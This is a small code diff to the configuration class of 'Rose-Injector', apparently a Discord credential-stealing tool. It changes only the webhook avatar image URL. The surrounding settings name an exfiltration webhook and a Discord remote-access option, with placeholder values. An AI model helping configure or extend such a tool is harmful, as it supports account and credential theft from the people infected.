@@ -7,7 +7,7 @@ class Config:
         self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector/' # remove 
         self.debug_mode = False
         self.webhook = 'HOOK'
-        self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png' # remove 
+        self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/Rose0.jpg' # remove 
         self.wh_name = 'Rose-Injector' # remove
         self.discord_rat = False
         self.discord_rat_socket_link = 'DISCORD_RAT_SOCKET_LINK'
